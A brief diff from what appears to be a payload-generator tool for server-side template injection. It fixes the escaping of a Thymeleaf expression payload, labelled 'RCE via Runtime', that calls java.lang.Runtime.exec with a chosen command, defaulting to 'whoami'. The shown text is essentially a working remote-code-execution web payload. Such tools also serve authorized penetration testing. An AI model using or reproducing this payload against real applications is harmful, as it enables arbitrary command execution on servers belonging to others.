@@ -231,7 +231,7 @@ $ex.waitFor()
       payloads.push({
         engine: 'thymeleaf',
         goal,
-        payload: `[[${T(java.lang.Runtime).getRuntime().exec('${target || 'whoami'}')}}]`,
+        payload: `[[\${T(java.lang.Runtime).getRuntime().exec('${target || 'whoami'}')}}]`,
         description: 'RCE via Runtime',
         expectedOutput: 'Command output'
       });
